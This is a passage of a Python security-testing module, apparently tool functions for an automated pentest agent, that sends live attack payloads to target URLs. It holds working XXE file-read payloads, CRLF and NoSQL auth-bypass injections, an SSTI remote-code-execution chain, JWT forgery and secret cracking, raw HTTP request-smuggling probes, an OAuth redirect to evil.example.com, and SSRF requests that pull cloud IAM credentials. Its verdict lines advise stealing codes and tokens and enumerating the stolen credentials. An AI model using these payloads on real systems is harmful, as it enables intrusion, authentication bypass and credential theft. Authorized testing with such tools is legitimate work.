"""Advanced capability toolkit: XXE, header injection, NoSQLi, SSTI, JWT
attacks, GraphQL, deserialization, HTTP request smuggling, OAuth flow,
cloud metadata SSRF, dependency CVE scanning, Active Directory probing.

These are DETECTION/ANALYSIS tools: they send a few non-destructive probes
and report signals with a VERDICT line. Follow the verdict - it tells you
what to run next (sqlmap, nuclei, Burp, manual testing...).
Authorized use only - targets must be in your engagement scope.
"""

import base64
import concurrent.futures
import hashlib
import hmac
import json
import os
import re
import socket
import ssl
import time
from urllib.parse import urlparse

import requests

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

MARKER = "hackerai_cap_7f3a"
_TIMEOUT = 15


def _session():
    s = requests.Session()
    s.headers["User-Agent"] = USER_AGENT
    return s


def _request(s, method, url, params=None, data=None, headers=None):
    method = (method or "GET").upper()
    try:
        if method == "GET":
            return s.get(url, params=params, headers=headers, timeout=_TIMEOUT, verify=False)
        return s.post(url, data=data, params=params, headers=headers,
                      timeout=_TIMEOUT, verify=False)
    except requests.exceptions.SSLError:
        return s.get(url, params=params, headers=headers, timeout=_TIMEOUT, verify=False)
    except requests.exceptions.RequestException as exc:
        return exc


def _status_of(resp):
    if isinstance(resp, Exception):
        return "error: %s" % resp
    return "HTTP %d (len=%d)" % (resp.status_code, len(resp.content))


def _body(resp):
    return resp.text if isinstance(resp, requests.Response) else ""


def _line(flag, msg):
    return "  [%s] %s" % ("VULN" if flag else "ok", msg)


# ---------------------------------------------------------------------------
# 1. XXE
# ---------------------------------------------------------------------------

def tool_xxe_test(url="", param="", data="", method="POST", content_type=""):
    """XXE detection: inject a DOCTYPE external entity that reads
    /etc/passwd (or c:/windows/win.ini on Windows targets) and check
    whether the file content is reflected in the response.

    - url: endpoint that parses XML (usually a POST endpoint)
    - data: optional original XML body - the entity is injected into its
      root element automatically
    - param: alternative - test a query/body parameter that gets parsed as XML
    """
    if not url:
        return "xxe_test: url is required"
    s = _session()
    ct = content_type or "application/xml"
    out = ["XXE probe: %s" % url, ""]
    found = False
    try:
        if data:
            m = re.search(r"<([a-zA-Z_][\w.-]*)(?:\s[^>]*)?>", data)
            root = m.group(1) if m else "root"
            payload = ('<?xml version="1.0"?><!DOCTYPE %s [<!ENTITY xxe '
                       'SYSTEM "file:///etc/passwd">]><%s>&xxe;</%s>'
                       % (root, root, root))
        else:
            payload = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe '
                       'SYSTEM "file:///etc/passwd">]><r>&xxe;</r>')
        r = _request(s, method, url, ({param: payload} if param else None),
                     data if not param else None,
                     {"Content-Type": ct})
        txt = _body(r)
        out.append("probe (file:///etc/passwd): %s" % _status_of(r))
        hit = "root:" in txt
        found = found or hit
        out.append(_line(hit, "'root:' file marker reflected -> classic XXE"))
        if hit:
            i = txt.find("root:")
            out.append("  evidence: ...%s..." % txt[max(0, i - 40):i + 140].replace("\n", "\\n")[:200])

        payload2 = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe '
                    'SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>')
        r2 = _request(s, method, url, ({param: payload2} if param else None),
                      data if not param else None,
                      {"Content-Type": ct})
        txt2 = _body(r2)
        out.append("probe (win.ini): %s" % _status_of(r2))
        hit2 = "[fonts]" in txt2
        found = found or hit2
        out.append(_line(hit2, "'[fonts]' marker reflected -> XXE on Windows target"))
        if hit2:
            i = txt2.find("[fonts]")
            out.append("  evidence: ...%s..." % txt2[max(0, i - 40):i + 140].replace("\n", "\\n")[:200])

        # blind XXE signal: entity with a syntax error should surface
        blind = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext '
                 'SYSTEM "file:///nonexistent">%ext;]><r>%s</r>' % MARKER)
        r3 = _request(s, method, url, ({param: blind} if param else None),
                      data if not param else None,
                      {"Content-Type": ct})
        txt3 = _body(r3)
        err = bool(re.search(r"DOCTYPE|Entity|parser|XML|external|DOCTYPE "
                             r"declaration|not well-formed", txt3, re.I))
        out.append("blind/error probe: %s" % _status_of(r3))
        out.append(_line(err, "XML parser error exposed in response -> blind XXE candidate"))

        out.append("")
        if found:
            out.append("VERDICT: XXE CONFIRMED (file disclosure). Log add_finding "
                       "(CWE-611). Try OOB exfil + SSRF entities next.")
        else:
            out.append("VERDICT: No file-read XXE signal. Try blind/OOB with an "
                       "external DTD (xxe_exfil) and SSRF entities if XML input exists.")
        return "\n".join(out)
    except Exception as exc:
        return "xxe_test error: %s" % exc


# ---------------------------------------------------------------------------
# 2. Header injection / CRLF
# ---------------------------------------------------------------------------

def tool_header_inject_test(url="", param="", method="GET", data=""):
    """CRLF / HTTP header injection detection on a parameter.

    Sends a param value containing \\r\\n plus an X-HackerAI-Test header and
    checks whether the server reflects it as a real response header.
    """
    if not url or not param:
        return "header_inject_test: url and param are required"
    s = _session()
    out = ["CRLF / header injection probe: %s ? %s" % (url, param), ""]
    try:
        # literal CRLF - requests percent-encodes it, server may decode+split
        payload = "\r\nX-HackerAI-Test: %s" % MARKER
        r = _request(s, method, url, {param: payload}, data)
        out.append("probe A (literal CRLF): %s" % _status_of(r))
        hit_a = False
        for k, v in r.headers.items():
            if "X-HackerAI-Test" in k or MARKER in str(v):
                hit_a = True
                out.append("  injected header seen: %s: %s" % (k, v))
        out.append(_line(hit_a, "injected header reflected in response"))

        # percent-encoded variant (some servers double-decode)
        payload2 = "%0d%0aX-HackerAI-Test: %s" % MARKER
        r2 = _request(s, method, url, {param: payload2}, data)
        out.append("probe B (%%0d%%0a): %s" % _status_of(r2))
        hit_b = any("X-HackerAI-Test" in k or MARKER in str(v)
                    for k, v in r2.headers.items())
        out.append(_line(hit_b, "encoded CRLF reflected as header"))

        out.append("")
        if hit_a or hit_b:
            out.append("VERDICT: HEADER INJECTION CONFIRMED - chain into cache "
                       "poisoning / response splitting / XSS via injected headers. "
                       "Log add_finding (CWE-113).")
        else:
            out.append("VERDICT: No header injection signal on this parameter.")
        return "\n".join(out)
    except Exception as exc:
        return "header_inject_test error: %s" % exc


# ---------------------------------------------------------------------------
# 3. NoSQL injection
# ---------------------------------------------------------------------------

def tool_nosql_inject_test(url="", user_param="username", pass_param="password",
                           method="POST"):
    """NoSQL injection (MongoDB operator injection) on a login endpoint.

    Sends a baseline login and then JSON bodies using $ne / $gt / $or
    operators; a status difference vs baseline = possible auth bypass.
    """
    if not url:
        return "nosql_inject_test: url is required"
    s = _session()
    out = ["NoSQL injection probe: %s" % url, ""]
    baseline = {user_param: "invalid_user_%s" % MARKER,
                pass_param: "invalid_pass_%s" % MARKER}
    payloads = [
        ("$ne/null both", {user_param: {"$ne": None}, pass_param: {"$ne": None}}),
        ("$gt/'' both", {user_param: {"$gt": ""}, pass_param: {"$gt": ""}}),
        ("admin + $ne", {user_param: "admin", pass_param: {"$ne": None}}),
        ("$or array", {"$or": [{user_param: "admin"},
                               {user_param: {"$ne": None}}],
                       pass_param: {"$ne": None}}),
        ("regex .*", {user_param: {"$regex": ".*"}, pass_param: {"$regex": ".*"}}),
    ]
    try:
        r0 = _request(s, method, url, data=json.dumps(baseline),
                      headers={"Content-Type": "application/json"})
        base_status = r0.status_code if isinstance(r0, requests.Response) else 0
        out.append("baseline: %s" % _status_of(r0))
        out.append("")

        verdict = False
        for name, payload in payloads:
            r = _request(s, method, url, data=json.dumps(payload),
                         headers={"Content-Type": "application/json"})
            st = r.status_code if isinstance(r, requests.Response) else 0
            diff = isinstance(r, requests.Response) and st != base_status
            # 200/302 on inject while baseline was 401/403/404 is the bypass signal
            bypass = diff and base_status in (401, 403, 404) and st in (200, 302, 303)
            verdict = verdict or bypass
            out.append("%-14s -> %s%s" % (name, _status_of(r),
                                          "   <-- STATUS CHANGE" if diff else ""))
            out.append(_line(bypass, "inject login differs from baseline (possible bypass)"))
        out.append("")
        if verdict:
            out.append("VERDICT: NoSQL AUTH BYPASS CANDIDATE - confirm by logging "
                       "in with the injected body. Log add_finding (CWE-943).")
        else:
            out.append("VERDICT: No obvious NoSQL operator-injection signal. If the "
                       "app is MongoDB-backed, test in-query params ($where, $regex) "
                       "and blind extraction next.")
        return "\n".join(out)
    except Exception as exc:
        return "nosql_inject_test error: %s" % exc


# ---------------------------------------------------------------------------
# 4. SSTI
# ---------------------------------------------------------------------------

def tool_ssti_test(url="", param="", method="GET", data=""):
    """Server-side template injection detection.

    Sends math payloads for Jinja2/Twig/FreeMarker/ERB; reflection of the
    computed value (49 / 7777777) = template evaluation = RCE candidate.
    """
    if not url or not param:
        return "ssti_test: url and param are required"
    s = _session()
    out = ["SSTI probe: %s ? %s" % (url, param), ""]
    probes = [
        ("{{7*7}} (Jinja/Twig)", "{{7*7}}", ["49"]),
        ("${7*7} (FreeMarker/JSP)", "${7*7}", ["49"]),
        ("<%= 7*7 %> (ERB)", "<%= 7*7 %>", ["49"]),
        ("{{7*'7'}} (Jinja str mult)", "{{7*'7'}}", ["7777777"]),
        ("#{7*7} (Ruby)", "#{7*7}", ["49"]),
    ]
    verdict = False
    try:
        for name, payload, expected in probes:
            r = _request(s, method, url, {param: payload}, data)
            txt = _body(r)
            hit = any(exp in txt for exp in expected)
            verdict = verdict or hit
            out.append("%-24s -> %s" % (name, _status_of(r)))
            out.append(_line(hit, "computed value %s reflected -> template executed"
                            % "/".join(expected)))
        out.append("")
        if verdict:
            out.append("VERDICT: SSTI CONFIRMED - template execution = RCE path. "
                       "Test {{config}} (Flask), __class__/__globals__ chains, "
                       "or RCE via the engine (Jinja: {{cycler.__init__.__globals__"
                       ".os.popen('id').read()}}). Log add_finding (CWE-1336).")
        else:
            out.append("VERDICT: No SSTI signal on this parameter.")
        return "\n".join(out)
    except Exception as exc:
        return "ssti_test error: %s" % exc


# ---------------------------------------------------------------------------
# 5. JWT attack suite
# ---------------------------------------------------------------------------

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "12345", "123456789", "12345678",
    "qwerty", "abc123", "admin", "letmein", "welcome", "iloveyou",
    "monkey", "dragon", "shadow", "master", "login", "passw0rd",
    "changeme", "secret123", "jwt_secret", "supersecret", "key", "test",
    "default", "1234", "football", "hunter2", "000000", "1q2w3e4r",
    "trustno1", "access", "your-256-bit-secret", "your_secret_key",
    "secretkey", "JWT_SECRET", "mysecret", "jsonwebtoken", "change_me",
]


def _b64u(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _b64u_decode(part):
    pad = part + "=" * (-len(part) % 4)
    return base64.urlsafe_b64decode(pad)


def _jwt_forge(header, payload):
    hi = _b64u(json.dumps(header, separators=(",", ":")).encode())
    pi = _b64u(json.dumps(payload, separators=(",", ":")).encode())
    return hi + "." + pi


def tool_jwt_attack(token="", public_key="", wordlist=""):
    """JWT security analysis + forgery kit.

    Decodes the token, then tests: alg=none, weak-secret brute-force
    (HS256), RS256->HS256 algorithm confusion (needs the RSA public key),
    and reports expired/invalid-issuer issues. Forged tokens are returned
    ready to replay against the application.
    """
    if not token:
        return ("jwt_attack: token is required. Grab one from Authorization "
                "header, cookies (access_token), or local/session storage.")
    out = ["JWT analysis", ""]
    try:
        header, payload, sig = token.split(".")
        h = json.loads(_b64u_decode(header))
        p = json.loads(_b64u_decode(payload))
    except Exception as exc:
        return "jwt_attack: not a valid JWT (3 dot-separated parts): %s" % exc

    out.append("header  : %s" % json.dumps(h))
    out.append("payload : %s" % json.dumps(p))
    exp = p.get("exp")
    if exp:
        import datetime
        dt = datetime.datetime.fromtimestamp(exp, datetime.timezone.utc)
        now = datetime.datetime.now(datetime.timezone.utc)
        state = "EXPIRED" if now > dt else "valid"
        out.append("exp     : %s (%s)" % (dt.strftime("%Y-%m-%d %H:%M:%S UTC"), state))
        out.append(_line(state == "EXPIRED", "token is expired - check if server validates exp"))
    if p.get("nbf"):
        out.append("nbf     : %s (check server enforces not-before)" % p["nbf"])
    if "iss" in p:
        out.append("iss     : %s (verify server pins the issuer)" % p["iss"])
    alg = h.get("alg", "?")
    out.append("alg     : %s" % alg)
    out.append("")

    # --- alg=none forgery
    if alg.lower() != "none":
        forged = _jwt_forge({"alg": "none", "typ": h.get("typ", "JWT")}, p) + "."
        out.append("[A] alg=none forgery (if server accepts 'none' it ignores the signature):")
        out.append("    " + forged)
    else:
        out.append("[A] token already claims alg=none - the server should have rejected it. Test anyway.")
    out.append("")

    # --- weak secret brute-force (HS256)
    if alg in ("HS256", "HS384", "HS512"):
        algo_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                    "HS512": hashlib.sha512}
        sign_in = (header + "." + (token.split(".")[1])).encode()
        try:
            target_sig = _b64u_decode(sig)
        except Exception:
            target_sig = None
        secrets = list(JWT_WEAK_SECRETS)
        if wordlist:
            try:
                secrets += [l.strip() for l in open(wordlist, encoding="utf-8",
                                                    errors="replace") if l.strip()]
            except Exception as exc:
                out.append("[B] wordlist '%s' unreadable: %s" % (wordlist, exc))
        cracked = None
        for sec in secrets:
            mac = hmac.new(sec.encode(), sign_in, algo_map[alg]).digest()
            if target_sig is not None and hmac.compare_digest(mac, target_sig):
                cracked = sec
                break
        if cracked:
            out.append("[B] WEAK SECRET CRACKED: '%s'" % cracked)
            out.append("    Forge arbitrary tokens: %s.%s.<sig>"
                       % (header, token.split(".")[1]))
            out.append("    Log add_finding (CWE-798/CWE-345) - token signing key is guessable.")
        else:
            out.append("[B] No match in %d common secrets (HS256)." % len(secrets))
    elif alg == "RS256":
        out.append("[B] RS256 token - try algorithm confusion: sign as HS256 using the "
                   "RSA PUBLIC key as the HMAC secret.")
        if public_key:
            forged = (_jwt_forge({"alg": "HS256", "typ": h.get("typ", "JWT")}, p)
                      + "." + _b64u(hmac.new(public_key.encode(),
                                             (_jwt_forge({"alg": "HS256", "typ": h.get("typ", "JWT")}, p)).encode(),
                                             hashlib.sha256).digest()))
            out.append("    HS256-forged with public key:")
            out.append("    " + forged)
            out.append("    (server must use the public key as HMAC secret - the classic CVE-2016-5431/5432 misconfig)")
        else:
            out.append("    Pass public_key= (PEM or JWK n/e) to forge it.")
    else:
        out.append("[B] alg %s - manual analysis needed (check for alg confusion vs ES/PS family)." % alg)
    out.append("")

    # --- structural flags
    if "kid" in h:
        out.append("[C] kid parameter present -> test path traversal / SQLi via kid "
                   "(server may fetch the key file by kid).")
    if "jku" in h or "x5u" in h:
        out.append("[C] jku/x5u header present -> test header injection of an attacker "
                   "JWKS URL (CVE-2018-0114 family).")
    if "typ" in h and str(h.get("typ")).lower() in ("", "none"):
        pass
    out.append("")
    out.append("VERDICT: Forge + replay the candidate tokens against the app. If a "
               "forged token is accepted, log add_finding (CWE-347 improper JWT verification).")
    return "\n".join(out)


# ---------------------------------------------------------------------------
# 6. GraphQL
# ---------------------------------------------------------------------------

def tool_graphql_check(url="", auth_header=""):
    """GraphQL endpoint testing: detect the endpoint, check introspection,
    batching (query amplification), and error verbosity."""
    if not url:
        return "graphql_check: url is required"
    s = _session()
    headers = {"Content-Type": "application/json"}
    if auth_header:
        headers["Authorization"] = auth_header
    out = ["GraphQL check: %s" % url, ""]
    try:
        r = s.post(url, json={"query": "{__typename}"}, headers=headers,
                   timeout=_TIMEOUT)
        out.append("endpoint probe ({__typename}): %s" % _status_of(r))
        is_gql = False
        try:
            j = r.json()
            is_gql = isinstance(j, dict) and ("data" in j or "errors" in j)
        except Exception:
            is_gql = "__typename" in r.text or "GraphQL" in r.text
        out.append(_line(is_gql, "endpoint responds to GraphQL query"))
        if not is_gql:
            out.append("VERDICT: endpoint does not look like GraphQL. Try common "
                       "paths first: /graphql, /v1/graphql, /api/graphql, /gql.")
            return "\n".join(out)
        out.append("")

        q = 'query{__schema{queryType{name} mutationType{name} types{name kind}}}'
        r2 = s.post(url, json={"query": q}, headers=headers, timeout=_TIMEOUT)
        introspected = False
        try:
            j2 = r2.json()
            types = (j2.get("data", {}).get("__schema", {}) or {}).get("types")
            introspected = bool(types)
            if introspected:
                names = [t.get("name") for t in types if t.get("name")][:40]
                out.append("introspection: ENABLED - %d types exposed" % len(types))
                out.append("  sample types: %s" % ", ".join(names))
                out.append("  QUERY: use get-schema.sh / graphql-client to dump the "
                           "full schema and map attack surface (queries, mutations).")
        except Exception:
            introspected = False
        out.append(_line(introspected, "schema introspection accessible"))
        out.append("")

        # batching amplification
        batch = [{"query": "{__typename}"}, {"query": "{__typename}"},
                 {"query": "{__typename}"}]
        r3 = s.post(url, json=batch, headers=headers, timeout=_TIMEOUT)
        batched = False
        try:
            j3 = r3.json()
            batched = isinstance(j3, list) and len(j3) == 3
        except Exception:
            batched = False
        out.append("batching probe (3 queries in 1 request): %s" % _status_of(r3))
        out.append(_line(batched, "query batching enabled -> rate-limit bypass + "
                                  "DoS amplification vector"))

        # error verbosity
        r4 = s.post(url, json={"query": "{__typename} broken"},
                    headers=headers, timeout=_TIMEOUT)
        verbose = bool(re.search(r"stack trace|at .+\.js|Syntax Error|Validation error",
                                 r4.text, re.I))
        out.append("error verbosity probe: %s" % _status_of(r4))
        out.append(_line(verbose, "stack traces / verbose errors leak internals"))

        out.append("")
        out.append("NEXT: dump schema -> enumerate queries/mutations -> test "
                   "authorization (field-level IDOR), injection in arguments, "
                   "alias-based batching brute force, DoS via deep nesting "
                   "(complexity limits).")
        return "\n".join(out)
    except Exception as exc:
        return "graphql_check error: %s" % exc


# ---------------------------------------------------------------------------
# 7. Deserialization
# ---------------------------------------------------------------------------

SER_SIGNATURES = [
    ("Java", re.compile(r"rO0AB|aced0005|H4sIAAAA|YAC5"), "java serialization"),
    ("PHP", re.compile(r"O:\d+:\"[A-Za-z_\\]+|a:\d+:\{|s:\d+:\""), "php unserialize"),
    ("Python pickle", re.compile(r"cos\nsystem|ctypes|_pickle|gASV|KGR0XQ"), "pickle RCE"),
    (".NET", re.compile(r"AAEAAAD/|/wEFAAQAA|BAAAB"), ".NET BinaryFormatter"),
    ("Ruby", re.compile(r"\x04\x08o:\x1f"), "ruby marshal"),
    ("JSON.NET", re.compile(r"\$\$type|\\u0024type"), "JSON.NET type handling"),
]


def tool_deserialization_check(request_text="", url="", param="", method="POST"):
    """Insecure deserialization detection.

    Two modes:
    - request_text=: scan a captured HTTP request/response (or app traffic
      snippet) for deserialization signatures (Java/PHP/Pickle/.NET/Ruby).
    - url= + param=: send a benign pickle probe to the endpoint and look
      for deserialization error strings in the response.
    """
    out = ["Deserialization check", ""]
    signals = []
    if request_text:
        for name, rx, desc in SER_SIGNATURES:
            if rx.search(request_text):
                signals.append(name)
                out.append(_line(True, "%s signature found (%s)" % (name, desc)))
        if signals:
            out.append("")
            out.append("VERDICT: SERIALIZED DATA DETECTED (%s) - trace where it is "
                       "deserialized and test gadget chains "
                       "(ysoserial / phpggc / pickletools). Log add_finding (CWE-502)."
                       % ", ".join(signals))
        else:
            out.append("No known deserialization signatures in the provided text.")
    if url:
        out.append("")
        out.append("endpoint probe: %s" % url)
        try:
            s = _session()
            pickle_probe = b"\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00\x8c\x03abc\x94."
            r = _request(s, method, url, ({param: pickle_probe.decode("latin1")} if param else None),
                         pickle_probe if not param else None)
            txt = _body(r)
            err = re.search(r"pickle|unpickle|TypeError|AttributeError|EOFError|"
                            r"java\.io|ClassCastException|StreamCorruptedException|"
                            r"unserialize|DeserializationException|SerializationException|"
                            r"Runtime.Serialization", txt, re.I)
            out.append("pickle probe: %s" % _status_of(r))
            out.append(_line(bool(err), "deserialization error string echoed: %s"
                             % (err.group(0) if err else "")))
            if err:
                out.append("")
                out.append("VERDICT: DESERIALIZATION ENDPOINT CONFIRMED - error surface "
                           "from raw pickle bytes. Test gadget chains (CWE-502).")
        except Exception as exc:
            out.append("probe error: %s" % exc)
    if not request_text and not url:
        return ("deserialization_check: provide request_text= (captured traffic) "
                "or url= (+param) to probe an endpoint.")
    return "\n".join(out)


# ---------------------------------------------------------------------------
# 8. HTTP request smuggling
# ---------------------------------------------------------------------------

def _raw_smug_probe(host, port, use_ssl, raw1, raw2, timeout=15):
    """Send raw1 and raw2 back-to-back on ONE connection, return combined text."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            ctx = ssl._create_unverified_context()
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(raw1)
        time.sleep(0.2)
        sock.sendall(raw2)
        sock.settimeout(timeout)
        data = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if len(data) > 32768:
                break
        sock.close()
        return data.decode("utf-8", errors="replace")
    except Exception as exc:
        return "raw probe error: %s" % exc


def _split_responses(text):
    """Rough split of concatenated HTTP responses."""
    parts = re.split(r"HTTP/\d(?:\.\d)?\s", text)
    return [("HTTP/1.1 " + p) if p else p for p in parts if p.strip()]


def tool_smuggling_detect(url="", method="POST"):
    """HTTP request smuggling detection (CL.TE and TE.CL) on one connection.

    Uses a benign smuggled 'GPOST' prefix + marker; a 405/501/echo in the
    follow-up response (or a status that differs from the baseline GET) is
    the desync signal. Single-connection and non-destructive, but smuggling
    probes can produce odd 4xx/5xx - run only inside declared scope and
    prefer a maintenance window.
    """
    if not url:
        return "smuggling_detect: url is required"
    try:
        u = urlparse(url if "://" in url else "http://" + url)
        host = u.hostname
        use_ssl = u.scheme == "https"
        port = u.port or (443 if use_ssl else 80)
    except Exception as exc:
        return "smuggling_detect: bad url: %s" % exc
    out = ["HTTP request smuggling probe: %s (%s:%d)" % (url, host, port), ""]

    # baseline
    base = _raw_smug_probe(host, port, use_ssl,
                           ("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"
                            % host).encode(), b"")
    m = re.search(r"HTTP/\d(?:\.\d)?\s(\d{3})", base)
    base_status = m.group(1) if m else "?"
    out.append("baseline GET /: HTTP status %s" % base_status)
    out.append("")

    # CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
    smug = ("GPOST / HTTP/1.1\r\nHost: %s\r\nContent-Type: "
            "application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1"
            % host)
    body = "0\r\n\r\n" + smug
    raw_clte = ("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%s"
                % (host, body)).encode()
    follow = ("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n"
              % host).encode()
    resp = _raw_smug_probe(host, port, use_ssl, raw_clte, follow)
    parts = _split_responses(resp)
    statuses = [re.search(r"HTTP/\d(?:\.\d)?\s(\d{3})", p).group(1)
                for p in parts if re.search(r"HTTP/\d(?:\.\d)?\s(\d{3})", p)]
    sig_clte = ("405" in statuses or "501" in statuses or "GPOST" in resp
                or "Unrecognized method" in resp or "x=1" in resp
                or (len(statuses) >= 2 and statuses[0] == "200" and statuses[1] != base_status))
    out.append("CL.TE probe: follow-up responses: %s" % (statuses or ["(none)"]))
    out.append(_line(sig_clte, "desync signal (smuggled GPOST consumed by backend)"))

    # TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
    smug2 = ("GPOST / HTTP/1.1\r\nHost: %s\r\nContent-Type: "
             "application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1"
             % host)
    chunk = "%x\r\n%s\r\n0\r\n\r\n" % (len(smug2), smug2)
    raw_tecl = ("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\n"
                "Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%s"
                % (host, chunk)).encode()
    resp2 = _raw_smug_probe(host, port, use_ssl, raw_tecl, follow)
    parts2 = _split_responses(resp2)
    statuses2 = [re.search(r"HTTP/\d(?:\.\d)?\s(\d{3})", p).group(1)
                 for p in parts2 if re.search(r"HTTP/\d(?:\.\d)?\s(\d{3})", p)]
    sig_tecl = ("405" in statuses2 or "501" in statuses2 or "GPOST" in resp2
                or "Unrecognized method" in resp2 or "x=1" in resp2
                or (len(statuses2) >= 2 and statuses2[0] == "200" and statuses2[1] != base_status))
    out.append("TE.CL probe: follow-up responses: %s" % (statuses2 or ["(none)"]))
    out.append(_line(sig_tecl, "desync signal (smuggled GPOST consumed by backend)"))

    out.append("")
    if sig_clte or sig_tecl:
        out.append("VERDICT: SMUGGLING CANDIDATE (%s) - validate with Burp "
                   "Repeater (single connection) and confirm front/back-end "
                   "parsers. Log add_finding (CWE-444). Chain: request "
                   "poisoning, cache poisoning, WAF bypass.")
    else:
        out.append("VERDICT: No desync signal. Note: single-connection tests can "
                   "miss edge cases (H2.CL/H2.TE, TE.TE) - use a full smuggling "
                   "suite if the app sits behind a proxy/CDN.")
    return "\n".join(out)


# ---------------------------------------------------------------------------
# 9. OAuth flow checks
# ---------------------------------------------------------------------------

def tool_oauth_check(auth_url="", redirect_uri="", client_id="", state=""):
    """OAuth 2.0 / OIDC flow misconfiguration checks.

    Tests: open redirect via redirect_uri (no allowlist), state parameter
    handling, response_type confusion. Then lists the manual steps for a
    full flow review (token leakage, PKCE, scope escalation).
    """
    if not auth_url:
        return "oauth_check: auth_url is required (the /authorize endpoint)"
    s = _session()
    out = ["OAuth check: %s" % auth_url, ""]
    try:
        # --- open redirect in redirect_uri
        evil = "https://evil.example.com/cb"
        params = {"client_id": client_id or "test-client",
                  "response_type": "code",
                  "redirect_uri": evil,
                  "scope": "openid"}
        if state:
            params["state"] = state
        r = s.get(auth_url, params=params, timeout=_TIMEOUT,
                  allow_redirects=False)
        loc = r.headers.get("Location", "")
        open_redir = "evil.example.com" in loc and r.status_code in (301, 302, 303, 307, 308)
        out.append("redirect_uri=evil probe: %s" % _status_of(r))
        out.append("  Location: %s" % (loc[:160] or "(none)"))
        out.append(_line(open_redir, "authorize endpoint redirects to attacker URI -> "
                                     "no redirect_uri allowlist (token theft)"))
        out.append("")

        # --- state handling
        if state and r.status_code in (301, 302, 303, 307, 308):
            state_echo = "state=%s" % state in loc
            out.append("state propagation: %s" % ("echoed in redirect (OK)" if state_echo
                                                  else "NOT echoed in Location"))
            out.append(_line(not state_echo, "state not propagated -> check if the app "
                                             "enforces it (CSRF on the OAuth callback)"))
            out.append("")

        # --- response_type confusion
        r2 = s.get(auth_url, params={"client_id": client_id or "test-client",
                                     "response_type": "token",
                                     "redirect_uri": redirect_uri or "https://app.example.com/cb"},
                   timeout=_TIMEOUT, allow_redirects=False)
        out.append("response_type=token probe: %s" % _status_of(r2))
        out.append(_line(r2.status_code in (301, 302, 303, 307, 308) and "#access_token" in
                         r2.headers.get("Location", ""),
                         "implicit flow hands back access_token in URL fragment -> leakage risk"))
        out.append("")

        out.append("MANUAL FLOW STEPS: 1) redirect_uri token leak via secondary params "
                   "(state, code, session)  2) authorization code reuse  3) PKCE "
                   "missing on public clients (CWE-346)  4) scope escalation "
                   "(response_type=code&scope=admin)  5) ID token signature/aud "
                   "validation  6) token swap CSRF via state.")
        out.append("")
        if open_redir:
            out.append("VERDICT: OAuth OPEN REDIRECT CONFIRMED - log add_finding "
                       "(CWE-601). Steal codes/tokens by baiting the victim to the "
                       "redirect.")
        else:
            out.append("VERDICT: No open redirect via redirect_uri on this endpoint "
                       "(may still have allowlist bypasses like prefix/suffix "
                       "matches - test those manually).")
        return "\n".join(out)
    except Exception as exc:
        return "oauth_check error: %s" % exc


# ---------------------------------------------------------------------------
# 10. Cloud metadata SSRF
# ---------------------------------------------------------------------------

CLOUD_META_TARGETS = [
    ("AWS IMDS v1", "http://169.254.169.254/latest/meta-data/",
     ["ami-id", "instance-id", "hostname", "placement/", "iam/"]),
    ("AWS IMDS creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     ["AccessKeyId", "SecretAccessKey", "Token"]),
    ("AWS user-data", "http://169.254.169.254/latest/user-data/",
     ["#!/bin", "#!/usr/bin", "export "]),
    ("AWS ECS creds", "http://169.254.170.2/v2/credentials",
     ["AccessKeyId", "SecretAccessKey", "RoleArn"]),
    ("AWS IMDS v1 IPv6", "http://[fd00:ec2::254]/latest/meta-data/",
     ["ami-id", "instance-id"]),
    ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     ["access_token", "expires_in"]),
    ("Alibaba meta", "http://100.100.100.200/latest/meta-data/",
     ["instance-id", "region-id"]),
    ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     ["vmId", "location"]),
]


def tool_cloud_meta_test(url="", param="", method="GET", data=""):
    """SSRF -> cloud metadata probe.

    Replays the request with the vulnerable parameter pointed at cloud
    metadata endpoints and checks whether metadata content comes back.
    Use AFTER ssrf_test flags the parameter as SSRF-prone.
    """
    if not url or not param:
        return ("cloud_meta_test: url and param are required (the SSRF-prone "
                "parameter). Run ssrf_test first to find it.")
    s = _session()
    out = ["Cloud metadata SSRF probe: %s ? %s" % (url, param), ""]
    for name, endpoint, markers in CLOUD_META_TARGETS:
        try:
            headers = None
            if "metadata.google" in endpoint:
                headers = {"Metadata-Flavor": "Google"}
            r = _request(s, method, url, {param: endpoint}, data, headers)
            txt = _body(r)
            hits = [m for m in markers if m in txt]
            status = _status_of(r)
            if hits:
                out.append("[VULN] %s -> %s" % (name, status))
                out.append("       markers found: %s" % ", ".join(hits))
                snippet = txt[:300].replace("\n", "\\n")
                out.append("       sample: %s" % snippet)
            else:
                out.append("  %-22s -> %s (no metadata markers)" % (name, status))
        except Exception as exc:
            out.append("  %-22s -> error: %s" % (name, exc))
    out.append("")
    out.append("NEXT: if creds came back, they are IAM temp credentials - scope them "
               "with 'aws sts get-caller-identity' and enumerate permissions.")
    return "\n".join(out)


# ---------------------------------------------------------------------------
# 11. Dependency CVE scan (OSV)
# ---------------------------------------------------------------------------

def _parse_lockfile(path):
    """Return (packages dict name->version, ecosystem)."""
